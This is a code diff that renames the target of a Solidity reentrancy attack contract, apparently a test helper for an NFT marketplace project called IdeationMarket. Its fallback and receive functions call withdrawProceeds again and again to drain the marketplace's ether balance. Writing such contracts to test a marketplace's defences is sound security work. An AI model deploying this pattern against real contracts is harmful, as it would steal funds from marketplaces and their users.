@@ -2,19 +2,19 @@
 
 pragma solidity ^0.8.7;
 
-import "contracts/NftMarketplace.sol";
+import "contracts/IdeationMarket.sol";
 import "./BasicNft.sol";
 import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract ReentrancyAttack is IERC721Receiver {
-    address payable s_nftMarketplaceAddress;
+    address payable s_ideationMarketAddress;
     address s_basicNftAddress;
-    NftMarketplace nftMarketplaceInstance;
+    IdeationMarket ideationMarketInstance;
     BasicNft basicNftInstance;
     uint256 private s_fallbackCounter = 0;
 
-    constructor(address nftMarketplaceAddress, address basicNftAddress) {
-        s_nftMarketplaceAddress = payable(nftMarketplaceAddress);
+    constructor(address ideationMarketAddress, address basicNftAddress) {
+        s_ideationMarketAddress = payable(ideationMarketAddress);
         s_basicNftAddress = basicNftAddress;
         basicNftInstance = BasicNft(s_basicNftAddress);
     }
@@ -25,35 +25,35 @@ contract ReentrancyAttack is IERC721Receiver {
 
     function mintNft(uint tokenId) public {
         basicNftInstance.mintNft();
-        basicNftInstance.approve(s_nftMarketplaceAddress, tokenId);
+        basicNftInstance.approve(s_ideationMarketAddress, tokenId);
     }
 
     function attack() public payable {
-        nftMarketplaceInstance = NftMarketplace(s_nftMarketplaceAddress);
-        nftMarketplaceInstance.listItem(
+        ideationMarketInstance = IdeationMarket(s_ideationMarketAddress);
+        ideationMarketInstance.listItem(
             s_basicNftAddress,
             3,
             0.1 ether,
             0x0000000000000000000000000000000000000000,
             0
         );
-        nftMarketplaceInstance.buyItem{value: 0.1 ether}(s_basicNftAddress, 3);
-        nftMarketplaceInstance.withdrawProceeds();
+        ideationMarketInstance.buyItem{value: 0.1 ether}(s_basicNftAddress, 3);
+        ideationMarketInstance.withdrawProceeds();
     }
 
     fallback() external payable {
         // fallback gets used by older solidity versions
-        if (s_fallbackCounter < 100 && address(s_nftMarketplaceAddress).balance >= 0.1 ether) {
+        if (s_fallbackCounter < 100 && address(s_ideationMarketAddress).balance >= 0.1 ether) {
             s_fallbackCounter++;
-            nftMarketplaceInstance.withdrawProceeds();
+            ideationMarketInstance.withdrawProceeds();
         }
     }
 
     receive() external payable {
-        if (address(s_nftMarketplaceAddress).balance >= 0.1 ether) {
+        if (address(s_ideationMarketAddress).balance >= 0.1 ether) {
             // I need the Counter because without this would be an infinite Loop ( at least for the gas estimation)
             s_fallbackCounter++;
-            nftMarketplaceInstance.withdrawProceeds();
+            ideationMarketInstance.withdrawProceeds();
         }
     }
 
